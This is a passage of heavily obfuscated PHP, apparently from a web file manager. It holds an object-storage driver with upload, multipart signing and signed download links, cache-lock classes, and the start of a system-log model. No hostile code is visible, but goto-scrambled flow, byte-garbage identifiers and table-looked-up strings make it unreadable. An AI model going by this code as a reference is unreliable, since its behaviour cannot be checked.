$A“èˆ‰Ä×ˆ[33]) { return $A”ğÏé«ñ–; } goto F”œšÅİÑ“; BÇÒ²’Áñ: return $A”ğÏé«ñ–; goto f½œÆ©ëå; F¼ø¤ÄÈ’á: $A“èˆ‰Ä×ˆ =& $_SERVER[Ü˜]; $A”ğÏé«ñ– = array($A“èˆ‰Ä×ˆ[28] => $this->pathThis($F™é†îÔóÑ), $A“èˆ‰Ä×ˆ[86] => $this->getPathOuter($A“èˆ‰Ä×ˆ[8] . $F™é†îÔóÑ), $A“èˆ‰Ä×ˆ[29] => $A“èˆ‰Ä×ˆ[87]); if ($AÕØ´ÜÚõ) { return $A”ğÏé«ñ–; } goto CÒâÕ˜ÛŠœ; f½œÆ©ëå: } private function fileList($e«ƒ£É’, $eÊ¸©ô§‹ = '', $Aƒ¯ ˆëÀò = 0) { goto b†´‚ŞÒ¯±; b†´‚ŞÒ¯±: $Cñç•Ç§°É =& $_SERVER[Ü˜]; $d£¯Ğä›·Š = rtrim($e«ƒ£É’, $Cñç•Ç§°É[8]) . $Cñç•Ç§°É[8]; $c‡óÁÓÚ‘Ä = $this->listObjs($d£¯Ğä›·Š, null, null, $eÊ¸©ô§‹); goto dµ™åËÓéŸ; dµ™åËÓéŸ: if (!$c‡óÁÓÚ‘Ä) { return array($Cñç•Ç§°É[85] => array(), $Cñç•Ç§°É[84] => array()); } $d‘¾Œ±¿Îš = $this->listItemCache === !1 ? !1 : !0; $cèİÑß ’• = $B´Ğİíèøš = array(); goto f¿Æö”›—Š; DÑ„ÉÅæŠ›: return array($Cñç•Ç§°É[85] => $cèİÑß ’•, $Cñç•Ç§°É[84] => $B´Ğİíèøš); goto D‰ò–¹´; f¿Æö”›—Š: foreach ($c‡óÁÓÚ‘Ä[$Cñç•Ç§°É[208]] as $Aõ’‚æÙ‡) { goto fö•ÒğÍ; b…Ó‘óŠà¡: $B´Ğİíèøš[] = $Aƒ¯ ˆëÀò ? $Aõ’‚æÙ‡ : $e”Ã˜‰†‰›; goto DùŒÈœ“‰¹; fö•ÒğÍ: $e”Ã˜‰†‰› = $Aõ’‚æÙ‡[$Cñç•Ç§°É[28]]; if ($e”Ã˜‰†‰› == $d£¯Ğä›·Š) { continue; } $dæ‰éò††· = isset($Aõ’‚æÙ‡[$Cñç•Ç§°É[88]]) ? $Aõ’‚æÙ‡[$Cñç•Ç§°É[88]] : 0; goto C‘äî’˜ã¥; C‘äî’˜ã¥: $a‘ ŠøÉ›¨ = $dæ‰éò††· == 0 && substr($e”Ã˜‰†‰›, strlen($e”Ã˜‰†‰›) - 1, 1) == $Cñç•Ç§°É[8] ? !0 : !1; if ($d‘¾Œ±¿Îš) { $this->cacheMethod($Cñç•Ç§°É[209], $e”Ã˜‰†‰›, $a‘ ŠøÉ›¨); $this->cacheMethod($Cñç•Ç§°É[210], $e”Ã˜‰†‰›, $Aõ’‚æÙ‡); } if ($a‘ ŠøÉ›¨) { $cèİÑß ’•[] = $e”Ã˜‰†‰›; continue; } goto b…Ó‘óŠà¡; DùŒÈœ“‰¹: } foreach ($c‡óÁÓÚ‘Ä[$Cñç•Ç§°É[211]] as $Aõ’‚æÙ‡) { $cèİÑß ’•[] = $Aõ’‚æÙ‡[$Cñç•Ç§°É[28]]; if ($d‘¾Œ±¿Îš) { $this->cacheMethod($Cñç•Ç§°É[209], $Aõ’‚æÙ‡[$Cñç•Ç§°É[28]], !0); } } if ($d‘¾Œ±¿Îš) { $this->cacheMethod($Cñç•Ç§°É[209], $e«ƒ£É’, !0); } goto DÑ„ÉÅæŠ›; D‰ò–¹´: } private function listObjs($fö·ñ”½è„, $B œ†‡Âƒº = null, $F®˜ò˜Ÿéã = null, $dËâœ¼¥†¬ = null) { $D¯Íë„‘š =& $_SERVER[Ü˜]; $fö·ñ”½è„ = trim($fö·ñ”½è„, $D¯Íë„‘š[8]); $cæãÎ¥Ğí× = empty($fö·ñ”½è„) && $fö·ñ”½è„ !== $D¯Íë„‘š[201] ? $D¯Íë„‘š[33] : $fö·ñ”½è„ . $D¯Íë„‘š[8]; return $this->client->getBucket($this->bucket, $cæãÎ¥Ğí×, $B œ†‡Âƒº, $F®˜ò˜Ÿéã, $dËâœ¼¥†¬, !0); } public function has($bš¨±“ğ², $A„ñƒ¯Ë = false, $EÛ¾Ä—Í•´ = true) { goto fÁÊçö; fÁÊçö: $D××àãĞ† =& $_SERVER[Ü˜]; $bš¨±“ğ² = trim($bš¨±“ğ², $D××àãĞ†[8]); $f¬œñÈÖ£ = empty($bš¨±“ğ²) && $bš¨±“ğ² !== $D××àãĞ†[201] ? $D××àãĞ†[33] : $bš¨±“ğ² . $D××àãĞ†[8]; goto c‰Å¿ĞÀ£°; c‰Å¿ĞÀ£°: $dâ®ØôÔµÃ = null; $d­éÒ‰äå„ = 500; $Aô‘õçÄä = $D××àãĞ†[8]; goto BÔğÔ§ÅĞ·; BÔğÔ§ÅĞ·: $b¦‚œ¢º Ñ = $DºĞÅ´…È = array(); while (!0) { $C÷ÙÑ“ë­™ = $this->listObjs($bš¨±“ğ², $dâ®ØôÔµÃ, $d­éÒ‰äå„, $Aô‘õçÄä); if (!$C÷ÙÑ“ë­™) { break; } $dâ®ØôÔµÃ = $C÷ÙÑ“ë­™[$D××àãĞ†[212]]; $F†¨Èø¿§´ = $C÷ÙÑ“ë­™[$D××àãĞ†[208]]; $eƒ‘ôïÎ„– = $C÷ÙÑ“ë­™[$D××àãĞ†[211]]; if (empty($F†¨Èø¿§´) && empty($eƒ‘ôïÎ„–)) { break; } if (count($F†¨Èø¿§´) == 1 && $F†¨Èø¿§´[0][$D××àãĞ†[28]] == $f¬œñÈÖ£) { break; } if ($A„ñƒ¯Ë) { if (count($F†¨Èø¿§´)) { $F†¨Èø¿§´ = array_column($F†¨Èø¿§´, $D××àãĞ†[28]); $b¦‚œ¢º Ñ = array_merge($b¦‚œ¢º Ñ, $F†¨Èø¿§´); } if (count($eƒ‘ôïÎ„–)) { $eƒ‘ôïÎ„– = array_column($eƒ‘ôïÎ„–, $D××àãĞ†[28]); $DºĞÅ´…È = array_merge($DºĞÅ´…È, $eƒ‘ôïÎ„–); } if ($dâ®ØôÔµÃ === null) { break; } continue; } if ($EÛ¾Ä—Í•´) { if (!empty($F†¨Èø¿§´)) { if (count($F†¨Èø¿§´) > 1 || isset($F†¨Èø¿§´[0][$D××àãĞ†[28]]) && $F†¨Èø¿§´[0][$D××àãĞ†[28]] != $f¬œñÈÖ£) { return !0; } } } else { if (!empty($eƒ‘ôïÎ„–)) { return !0; } } if ($dâ®ØôÔµÃ === null) { break; } } if ($A„ñƒ¯Ë) { $b¦‚œ¢º Ñ = array_diff($b¦‚œ¢º Ñ, array($f¬œñÈÖ£)); $b¦‚œ¢º Ñ = count(array_unique($b¦‚œ¢º Ñ)); $DºĞÅ´…È = count(array_unique($DºĞÅ´…È)); return array($D××àãĞ†[213] => $b¦‚œ¢º Ñ, $D××àãĞ†[214] => $DºĞÅ´…È); } goto Cò˜ÉÓ”ƒÇ; Cò˜ÉÓ”ƒÇ: return !1; goto dö¨ÂàšÏ®; dö¨ÂàšÏ®: } public function listAll($DÊÑ¬¹§ö–) { $Aàó„çÚ«Ì =& $_SERVER[Ü˜]; $Eä‹’”ã = $this->fileList($DÊÑ¬¹§ö–, $Aàó„çÚ«Ì[33], !0); $bÔ¤Ô°àÓŠ = array(); foreach ($Eä‹’”ã[$Aàó„çÚ«Ì[84]] as $A‚±á¶‰Ôò) { $bÔ¤Ô°àÓŠ[$A‚±á¶‰Ôò[$Aàó„çÚ«Ì[28]]] = $A‚±á¶‰Ôò[$Aàó„çÚ«Ì[88]]; } foreach ($Eä‹’”ã[$Aàó„çÚ«Ì[85]] as $A‚±á¶‰Ôò) { if (is_string($A‚±á¶‰Ôò)) { $bÔ¤Ô°àÓŠ[$A‚±á¶‰Ôò] = 0; } } return $this->listAllFiles($DÊÑ¬¹§ö–, array_keys($bÔ¤Ô°àÓŠ), $bÔ¤Ô°àÓŠ); } public function canRead($e¨´¡˜ÖîÆ) { $EÛëõ„ƒŸ¸ =& $_SERVER[Ü˜]; $cÉšƒ¼®ª = $this->client->getAccessControlPolicy($this->bucket, $e¨´¡˜ÖîÆ); if (!$cÉšƒ¼®ª) { return !1; } return in_array($cÉšƒ¼®ª, array($EÛëõ„ƒŸ¸[215], $EÛëõ„ƒŸ¸[216], $EÛëõ„ƒŸ¸[217])) ? !0 : !1; } public function canWrite($Cƒ²ÅÂß—) { $bß§ğ«ãŸË =& $_SERVER[Ü˜]; $FÂĞÁ±ë½Ï = $this->client->getAccessControlPolicy($this->bucket, $Cƒ²ÅÂß—); if (!$FÂĞÁ±ë½Ï) { return !1; } return in_array($FÂĞÁ±ë½Ï, array($bß§ğ«ãŸË[215], $bß§ğ«ãŸË[216])) ? !0 : !1; } public function getContent($BµõŸÉ—·) { return $this->client->getObject($this->bucket, $BµõŸÉ—·); } public function setContent($fĞÇ·Ÿ—³, $f¿àŒ‹¿± = '', $dÜ‚è„–•ß = false) { goto bÉİğ«â; bÉİğ«â: $eï¶”î =& $_SERVER[Ü˜]; $fĞÇ·Ÿ—³ = $dÜ‚è„–•ß ? trim($fĞÇ·Ÿ—³, $eï¶”î[8]) . $eï¶”î[8] : $fĞÇ·Ÿ—³; $aÊ°•Ô¥•¾ = get_file_mime(get_path_ext($fĞÇ·Ÿ—³)); goto EÏÔ³Ó…Ÿ»; BæÕÍ°³ì²: $this->cacheMethod(null, null); $BùîçÜ‰Š´ = $this->copyFile($fĞÇ·Ÿ—³, $fĞÇ·Ÿ—³, array($eï¶”î[218] => $BùîçÜ‰Š´[$eï¶”î[219]])); return $BùîçÜ‰Š´ ? !0 : !1; goto A‡ùíÏ¯ ›; EÏÔ³Ó…Ÿ»: $BùîçÜ‰Š´ = $this->client->putObject($f¿àŒ‹¿±, $this->bucket, $fĞÇ·Ÿ—³, $eï¶”î[202], array(), $aÊ°•Ô¥•¾); if (!$BùîçÜ‰Š´) { return !1; } if ($dÜ‚è„–•ß) { return !0; } goto BæÕÍ°³ì²; A‡ùíÏ¯ ›: } public function fileSubstr($bö†¦òæ–›, $fŒÜÔÉˆğå, $a ‘ĞĞğàÃ) { $AİçÙ’çÚ = $fŒÜÔÉˆğå + $a ‘ĞĞğàÃ - 1; return $this->client->getObject($this->bucket, $bö†¦òæ–›, array($_SERVER[Ü˜][220] => "\x62\171\164\145\163\75{$fŒÜÔÉˆğå}\55{$AİçÙ’çÚ}")); } public function upload($A„¯ÃÂ–©‘, $DäÀ›†‚ï˜, $C‰¾ƒÀœÈ = false, $Fê»‚„¬ãô = REPEAT_REPLACE) { $Aİ¶İğë¿ =& $_SERVER[Ü˜]; $C•¾ëÈ‘“õ = array($Aİ¶İğë¿[218] => @md5_file($DäÀ›†‚ï˜)); $dÎíÕÄ›•Ñ = array($Aİ¶İğë¿[221] => get_file_mime(get_path_ext($A„¯ÃÂ–©‘))); if (IO::size($DäÀ›†‚ï˜) <= 1024 * 1024 * 200) { $Cª¯ÆÓòÂó = $this->client->putObjectFile($DäÀ›†‚ï˜, $this->bucket, $A„¯ÃÂ–©‘, $Aİ¶İğë¿[202], $C•¾ëÈ‘“õ, $dÎíÕÄ›•Ñ); return !empty($Cª¯ÆÓòÂó) ? $this->getPathOuter($A„¯ÃÂ–©‘) : !1; } $A³…Ñ­ÜÇ = $this->client->multiUploadObject($DäÀ›†‚ï˜, $this->bucket, trim($A„¯ÃÂ–©‘, $Aİ¶İğë¿[8]), $C•¾ëÈ‘“õ, $dÎíÕÄ›•Ñ); return $A³…Ñ­ÜÇ ? $this->getPathOuter($A„¯ÃÂ–©‘) : !1; } public function download($FÛ³¶•öœ, $b©çĞàğ ¬) { if (!@is_dir($this->pathFather($b©çĞàğ ¬)) && !IO::mkdir($this->pathFather($b©çĞàğ ¬))) { return !1; } $fµŒª¾Óê‹ = $this->client->getObject($this->bucket, $FÛ³¶•öœ, array(), $b©çĞàğ ¬); return $fµŒª¾Óê‹ !== !1 ? $b©çĞàğ ¬ : !1; } public function link($dÔÂŞŠøáí, $C³‚ÊàŒ÷™ = array()) { $fÆ²ß—Ç†« =& $_SERVER[Ü˜]; if ($this->signVer == $fÆ²ß—Ç†«[222]) { return $this->client->getAuthenticatedURL($this->bucket, $dÔÂŞŠøáí, 3600 * 12, $C³‚ÊàŒ÷™); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dÔÂŞŠøáí, $fÆ²ß—Ç†«[8]), 3600 * 12, $this->region, array(), !0, $C³‚ÊàŒ÷™); } public function fileOut($E¸®•…æ»¶, $c× °–ƒÒÏ = false, $Dˆ–æÄõÌ½ = false, $fùÛ¸ãÜ…¹ = '') { goto d‡ø²”¾Ñ; cÖ£¼ªƒÍ: $añíƒ·‰Û = get_file_mime(get_path_ext($Dˆ–æÄõÌ½)); if ($añíƒ·‰Û == $Fâ¥í£“½„[223]) { return parent::fileOut($E¸®•…æ»¶, $c× °–ƒÒÏ, $Dˆ–æÄõÌ½, $fùÛ¸ãÜ…¹); } $c× °–ƒÒÏ = $c× °–ƒÒÏ ? $Fâ¥í£“½„[224] : $Fâ¥í£“½„[225]; goto Dª™³â‚Œ; d‡ø²”¾Ñ: $Fâ¥í£“½„ =& $_SERVER[Ü˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($E¸®•…æ»¶, $c× °–ƒÒÏ, $Dˆ–æÄõÌ½, $fùÛ¸ãÜ…¹); } if (!$Dˆ–æÄõÌ½) { $Dˆ–æÄõÌ½ = $this->pathThis($E¸®•…æ»¶); } goto cÖ£¼ªƒÍ; Dª™³â‚Œ: $E–ò„Áƒğø = array($Fâ¥í£“½„[226] => $c× °–ƒÒÏ . $Fâ¥í£“½„[227] . rawurlencode($Dˆ–æÄõÌ½), $Fâ¥í£“½„[228] => $añíƒ·‰Û); $DŠÖœôŠ„÷ = $this->link($E¸®•…æ»¶, $E–ò„Áƒğø); $this->fileOutLink($DŠÖœôŠ„÷); goto aêìÍäĞ; aêìÍäĞ: } public function fileOutServer($EÃ…Õƒ‘ëÖ, $Eáß™îÃ¶” = false, $aáá†¿Ç«ƒ = false, $bù¾Úïñˆ = '') { parent::fileOut($EÃ…Õƒ‘ëÖ, $Eáß™îÃ¶”, $aáá†¿Ç«ƒ, $bù¾Úïñˆ); } public function fileOutImageServer($aò’¹Ó‰—Ş, $BãÀ´¤ğ³Í = 250) { parent::fileOutImage($aò’¹Ó‰—Ş, $BãÀ´¤ğ³Í); } public function hashMd5($a¹ÒİÂ¾³ø, $CĞ¶§Ç„íÔ = '') { $C±„ç½ÉÎç =& $_SERVER[Ü˜]; $eÌËÑÀÒ†… = $this->objectMeta($a¹ÒİÂ¾³ø); if (!$eÌËÑÀÒ†…) { return !1; } $CĞ¶§Ç„íÔ = $CĞ¶§Ç„íÔ ? $CĞ¶§Ç„íÔ : _get($eÌËÑÀÒ†…, $C±„ç½ÉÎç[229]); $CĞ¶§Ç„íÔ = $CĞ¶§Ç„íÔ ? $CĞ¶§Ç„íÔ : _get($eÌËÑÀÒ†…, $C±„ç½ÉÎç[219], $C±„ç½ÉÎç[33]); return $CĞ¶§Ç„íÔ; } public function uploadFormData($F¸ùñêµÂí, $C¹İ‡ Ú³Å = 3600) { $FàÂ×¦î§Ö =& $_SERVER[Ü˜]; $F¯Á¢´Ê‰Î = $this->pathFather($F¸ùñêµÂí); $B´‹Ø§‰Õº = $this->client->getHttpUploadPostParams($this->bucket, $F¯Á¢´Ê‰Î, $FàÂ×¦î§Ö[202], $C¹İ‡ Ú³Å); return array_merge((array) $B´‹Ø§‰Õº, array($FàÂ×¦î§Ö[185] => $this->getHost())); } public function multiUploadFormData($C¿É“Ñï…, $eÀñ°Ó¶Â• = 3600) { $cîôˆ—Âª =& $_SERVER[Ü˜]; $eÊ¢§¾­º = gmdate($cîôˆ—Âª[230]); $dïæÚôÑé = array(); $B‰œ»Îò÷— = $this->client->getUploadId($this->bucket, $C¿É“Ñï…, $dïæÚôÑé); if (!$B‰œ»Îò÷—) { return !1; } return array($cîôˆ—Âª[231] => $B‰œ»Îò÷—, $cîôˆ—Âª[185] => $this->getHost() . $cîôˆ—Âª[8] . $this->pathEncode($C¿É“Ñï…), $cîôˆ—Âª[232] => $eÊ¢§¾­º, $cîôˆ—Âª[103] => $C¿É“Ñï…); } public function multiUploadAuthData($A³¯ó’¤ÁÚ, $bä¡ª×Ÿ‡‚ = array()) { goto EÉÍÇ‡“ç; EÉÍÇ‡“ç: $C½Â×èğ¬ =& $_SERVER[Ü˜]; $fòÌ•÷©ô„ = isset($bä¡ª×Ÿ‡‚[$C½Â×èğ¬[232]]) ? $bä¡ª×Ÿ‡‚[$C½Â×èğ¬[232]] : gmdate($C½Â×èğ¬[230]); $BÛ¥ô«Äš… = isset($bä¡ª×Ÿ‡‚[$C½Â×èğ¬[178]]) ? $bä¡ª×Ÿ‡‚[$C½Â×èğ¬[178]] : $C½Â×èğ¬[33]; goto e˜îš‚çî¡; e˜îš‚çî¡: $EÅù¹„òî = $bä¡ª×Ÿ‡‚[$C½Â×èğ¬[103]]; unset($bä¡ª×Ÿ‡‚[$C½Â×èğ¬[103]]); if (isset($bä¡ª×Ÿ‡‚[$C½Â×èğ¬[233]])) { $bä¡ª×Ÿ‡‚[$C½Â×èğ¬[232]] = $fòÌ•÷©ô„; return $this->listUploadParts($EÅù¹„òî, $bä¡ª×Ÿ‡‚); } goto AõÆ´æ¬£‘; AõÆ´æ¬£‘: $DèĞÛë³Ê = array($C½Â×èğ¬[234], $C½Â×èğ¬[33], $C½Â×èğ¬[129], $C½Â×èğ¬[33], "\170\55\141\155\172\x2d\144\x61\x74\x65\72{$fòÌ•÷©ô„}", $C½Â×èğ¬[8] . $this->bucket . $C½Â×èğ¬[8] . $this->pathEncode($EÅù¹„òî) . $BÛ¥ô«Äš…); if (strpos($BÛ¥ô«Äš…, $C½Â×èğ¬[235]) === 0) { $DèĞÛë³Ê[0] = $C½Â×èğ¬[236]; } if (isset($bä¡ª×Ÿ‡‚[$C½Â×èğ¬[237]]) && $bä¡ª×Ÿ‡‚[$C½Â×èğ¬[237]] == $C½Â×èğ¬[238]) { $DèĞÛë³Ê[0] = $C½Â×èğ¬[238]; } goto cİÊ™‡Î´×; A±í¢âõÃÏ: if (strpos($BÛ¥ô«Äš…, $C½Â×èğ¬[235]) === 0) { return array($C½Â×èğ¬[241] => $Fê‚ˆ—ÃÄ, $C½Â×èğ¬[232] => $fòÌ•÷©ô„); } return $Fê‚ˆ—ÃÄ; goto cĞÜù‰ƒ³; cİÊ™‡Î´×: $fÒ£ªˆƒ¸ = implode($C½Â×èğ¬[63], $DèĞÛë³Ê); $c’ƒÙËÍê = base64_encode(hash_hmac($C½Â×èğ¬[239], $fÒ£ªˆƒ¸, $this->secret, !0)); $Fê‚ˆ—ÃÄ = $C½Â×èğ¬[240] . $this->accessKey . $C½Â×èğ¬[4] . $c’ƒÙËÍê; goto A±í¢âõÃÏ; cĞÜù‰ƒ³: } public function listUploadParts($a¢Ä”Àá, $CÉÆÚô¹¾Ü = array()) { goto bë›ªæ¦‡; bë›ªæ¦‡: $b‚“ÄïÆë =& $_SERVER[Ü˜]; $DÀÎ™è´Æ· = str_replace($b‚“ÄïÆë[242], $b‚“ÄïÆë[33], $CÉÆÚô¹¾Ü[$b‚“ÄïÆë[178]]); $D£Ü ±ËÒ¡ = $this->client->listParts($this->bucket, $a¢Ä”Àá, $DÀÎ™è´Æ·); goto FåÉÉºÓ¬¹; FåÉÉºÓ¬¹: if (!$D£Ü ±ËÒ¡) { return !1; } unset($CÉÆÚô¹¾Ü[$b‚“ÄïÆë[233]], $CÉÆÚô¹¾Ü[$b‚“ÄïÆë[237]]); $CÉÆÚô¹¾Ü[$b‚“ÄïÆë[103]] = $a¢Ä”Àá; goto bÓ¢·ëš¨†; bÓ¢·ëš¨†: $B§˜”¶Êä— = $this->multiUploadAuthData($a¢Ä”Àá, $CÉÆÚô¹¾Ü); if (empty($B§˜”¶Êä—)) { return !1; } return array($b‚“ÄïÆë[241] => $B§˜”¶Êä—, $b‚“ÄïÆë[232] => $CÉÆÚô¹¾Ü[$b‚“ÄïÆë[232]], $b‚“ÄïÆë[243] => $D£Ü ±ËÒ¡); goto c¦áŞäÀ¸˜; c¦áŞäÀ¸˜: } public function getHost() { return parent::getHost() . $_SERVER[Ü˜][8] . $this->bucket; } public function size($f­íôÜ¼Ö) { $e’ˆ×–™Ñ² = $this->objectMeta($f­íôÜ¼Ö); return $e’ˆ×–™Ñ² ? $e’ˆ×–™Ñ²[$_SERVER[Ü˜][88]] : 0; } public function info($d¿ìËè»òñ) { if ($this->isFolder($d¿ìËè»òñ)) { return $this->folderInfo($d¿ìËè»òñ); } else { if ($this->isFile($d¿ìËè»òñ)) { return $this->fileInfo($d¿ìËè»òñ); } } return !1; } public function exist($aÑƒó÷Œ†¬) { return $this->isFile($aÑƒó÷Œ†¬) || $this->isFolder($aÑƒó÷Œ†¬); } public function isFile($f†²¾¹óÊî) { return !$this->isFolder($f†²¾¹óÊî) && $this->objectMeta($f†²¾¹óÊî); } public function isFolder($aîóéØ˜ëÚ) { return $this->cacheMethod($_SERVER[Ü˜][209], $aîóéØ˜ëÚ); } protected function objectMeta($c§ÌÃ¥´Ñ) { return $this->cacheMethod($_SERVER[Ü˜][210], $c§ÌÃ¥´Ñ); } protected function _objectMeta($fí–Ö¡ÔØ¹) { $A‚ğÆ„ÔŸ =& $_SERVER[Ü˜]; $fí–Ö¡ÔØ¹ = rtrim($fí–Ö¡ÔØ¹, $A‚ğÆ„ÔŸ[8]); try { $b«Õ¶¶İåÒ = $this->client->getObjectInfo($this->bucket, $fí–Ö¡ÔØ¹); if (!isset($b«Õ¶¶İåÒ[$A‚ğÆ„ÔŸ[229]]) && isset($b«Õ¶¶İåÒ[$A‚ğÆ„ÔŸ[244]])) { $b«Õ¶¶İåÒ[$A‚ğÆ„ÔŸ[229]] = $b«Õ¶¶İåÒ[$A‚ğÆ„ÔŸ[244]]; } } catch (Exception $fï¥çÆùµ¥) { $b«Õ¶¶İåÒ = !1; } if (!$b«Õ¶¶İåÒ) { } return $b«Õ¶¶İåÒ; } protected function _isFolder($c‡ÊÄì¿¿) { goto dã¹‡Òšº«; dã¹‡Òšº«: $Fáëäæ…´ =& $_SERVER[Ü˜]; $c‡ÊÄì¿¿ = rtrim($c‡ÊÄì¿¿, $Fáëäæ…´[8]); if ($c‡ÊÄì¿¿ == $Fáëäæ…´[33] || $c‡ÊÄì¿¿ == $Fáëäæ…´[8]) { return !0; } goto f¤õËß–í; f¤õËß–í: $D™Èæ¯›¾õ = $this->client->getBucket($this->bucket, $c‡ÊÄì¿¿, null, 1); if (empty($D™Èæ¯›¾õ[$Fáëäæ…´[208]])) { return !1; } $C£”éë¿ßÔ = $D™Èæ¯›¾õ[$Fáëäæ…´[208]][0][$Fáëäæ…´[28]]; goto Cğò°¸¸ô¹; Cğò°¸¸ô¹: return stripos($C£”éë¿ßÔ, $c‡ÊÄì¿¿ . $Fáëäæ…´[8]) === 0 ? !0 : !1; if (substr($C£”éë¿ßÔ, -1) == $Fáëäæ…´[8]) { return !0; } if (get_path_this($C£”éë¿ßÔ) == get_path_this($c‡ÊÄì¿¿)) { return !1; } goto c äÎ•ê‰“; c äÎ•ê‰“: return !0; goto Fß¡÷ñ´¢; Fß¡÷ñ´¢: } } define($_SERVER[Ü˜][245], 1); goto DÖãÁÇèø‡; eÇ‰Ãï¾Í: class CacheLockRedis { public function lock($F¾îÀê¯æ, $F¡‰›Ò²ƒß = 10) { $d¤åáÇ‚™Æ = Cache::init(); $Aù·ğË ¦‡ = microtime(!0) + $F¡‰›Ò²ƒß; while (microtime(!0) < $Aù·ğË ¦‡) { $Eõ‡ŞÊŒ¯ = $d¤åáÇ‚™Æ->get($F¾îÀê¯æ); if (!$Eõ‡ŞÊŒ¯) { $dêáäŸò÷Ÿ = $d¤åáÇ‚™Æ->setLock($F¾îÀê¯æ, $Aù·ğË ¦‡, $F¡‰›Ò²ƒß); if ($dêáäŸò÷Ÿ) { return !0; } } else { if ($Eõ‡ŞÊŒ¯ < microtime(!0)) { $d¤åáÇ‚™Æ->set($F¾îÀê¯æ, $Aù·ğË ¦‡, $F¡‰›Ò²ƒß * 2); if ($d¤åáÇ‚™Æ->get($F¾îÀê¯æ) === $Eõ‡ŞÊŒ¯) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E¤Øä¬ªß‘) { return Cache::init()->get($E¤Øä¬ªß‘); } public function unlock($d¿ˆÑÇå«ô) { return Cache::init()->remove($d¿ˆÑÇå«ô); } } class CacheLockMemcached { public function lock($Fô¤Ÿ†á‚Ğ, $A§êƒí ìğ = 0) { $Cîí‡ØêŠ´ = Cache::init(); $cÃŸÉËä„ì = microtime(!0) + $A§êƒí ìğ; while (microtime(!0) < $cÃŸÉËä„ì) { $C¨ø’›Ôõ = $Cîí‡ØêŠ´->get($Fô¤Ÿ†á‚Ğ); if (!$C¨ø’›Ôõ || $C¨ø’›Ôõ < microtime(!0)) { $c±âŠÛºÑ = $Cîí‡ØêŠ´->handle->add($Fô¤Ÿ†á‚Ğ, $cÃŸÉËä„ì, $A§êƒí ìğ); if ($c±âŠÛºÑ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($e Ä˜’²´) { return Cache::init()->get($e Ä˜’²´); } public function unlock($DÔì¸˜ÊÀŒ) { return Cache::init()->remove($DÔì¸˜ÊÀŒ); } } class CacheLockDatabase { public function lock($E«•¸ã¸…‘, $e «äæ¥´Î = 0) { $fÃ”ÊœÄù = Model($_SERVER[Ü˜][803]); $e¾Å“ÇêÖ” = microtime(!0) + $e «äæ¥´Î; while (microtime(!0) < $e¾Å“ÇêÖ”) { $b±£é½ë•Ì = $fÃ”ÊœÄù->get($E«•¸ã¸…‘); if (!$b±£é½ë•Ì || $b±£é½ë•Ì < microtime(!0)) { $E¯ÈšÔà™‰ = $fÃ”ÊœÄù->set($E«•¸ã¸…‘, $e¾Å“ÇêÖ”); if ($E¯ÈšÔà™‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A–Êº÷Œ­) { return Model($_SERVER[Ü˜][803])->get($A–Êº÷Œ­); } public function unlock($eò±²¬­Î§) { Model($_SERVER[Ü˜][803])->remove($eò±²¬­Î§); } } goto Báò»âÇÙ„; d”â§ßéÖ¿: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\155\x65", "\x74\x69\155\x65", "\151\156\x73\x65\162\x74", "\x66\x75\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $DŠ´‹»õ²° =& $_SERVER[Ü˜]; return array($DŠ´‹»õ²°[2005] => LNG($DŠ´‹»õ²°[2006]), $DŠ´‹»õ²°[2007] => LNG($DŠ´‹»õ²°[2008]), $DŠ´‹»õ²°[1633] => LNG($DŠ´‹»õ²°[2009]), $DŠ´‹»õ²°[2010] => LNG($DŠ´‹»õ²°[2011]), $DŠ´‹»õ²°[2012] => LNG($DŠ´‹»õ²°[2013]), $DŠ´‹»õ²°[2014] => LNG($DŠ´‹»õ²°[2015]), $DŠ´‹»õ²°[2016] => LNG($DŠ´‹»õ²°[2017]), $DŠ´‹»õ²°[1663] => LNG($DŠ´‹»õ²°[2017]), $DŠ´‹»õ²°[1664] => LNG($DŠ´‹»õ²°[2018]), $DŠ´‹»õ²°[2019] => LNG($DŠ´‹»õ²°[2020]), $DŠ´‹»õ²°[2021] => LNG($DŠ´‹»õ²°[2022]), $DŠ´‹»õ²°[2023] => LNG($DŠ´‹»õ²°[2024]), $DŠ´‹»õ²°[2025] => LNG($DŠ´‹»õ²°[2026]), $DŠ´‹»õ²°[1661] => LNG($DŠ´‹»õ²°[2027]), $DŠ´‹»õ²°[2028] => LNG($DŠ´‹»õ²°[2029]), $DŠ´‹»õ²°[1668] => LNG($DŠ´‹»õ²°[2030]), $DŠ´‹»õ²°[2031] => LNG($DŠ´‹»õ²°[2032]), $DŠ´‹»õ²°[2033] => LNG($DŠ´‹»õ²°[2034]), $DŠ´‹»õ²°[2035] => LNG($DŠ´‹»õ²°[2036]), $DŠ´‹»õ²°[2037] => LNG($DŠ´‹»õ²°[2038]), $DŠ´‹»õ²°[1671] => LNG($DŠ´‹»õ²°[2039]), $DŠ´‹»õ²°[1672] => LNG($DŠ´‹»õ²°[2040]), $DŠ´‹»õ²°[2041] => LNG($DŠ´‹»õ²°[2042]), $DŠ´‹»õ²°[2043] => LNG($DŠ´‹»õ²°[2044]), $DŠ´‹»õ²°[2045] => LNG($DŠ´‹»õ²°[2046]), $DŠ´‹»õ²°[1666] => LNG($DŠ´‹»õ²°[2047]), $DŠ´‹»õ²°[2048] => LNG($DŠ´‹»õ²°[2049]), $DŠ´‹»õ²°[1665] => LNG($DŠ´‹»õ²°[2050]), $DŠ´‹»õ²°[2051] => LNG($DŠ´‹»õ²°[2052]), $DŠ´‹»õ²°[2053] => LNG($DŠ´‹»õ²°[2054]), $DŠ´‹»õ²°[2055] => LNG($DŠ´‹»õ²°[2056]), $DŠ´‹»õ²°[2057] => LNG($DŠ´‹»õ²°[2057]), $DŠ´‹»õ²°[2058] => LNG($DŠ´‹»õ²°[1637]), $DŠ´‹»õ²°[2059] => LNG($DŠ´‹»õ²°[2060]), $DŠ´‹»õ²°[2061] => LNG($DŠ´‹»õ²°[2062]), $DŠ´‹»õ²°[2063] => LNG($DŠ´‹»õ²°[2064]), $DŠ´‹»õ²°[2065] => LNG($DŠ´‹»õ²°[2066]), 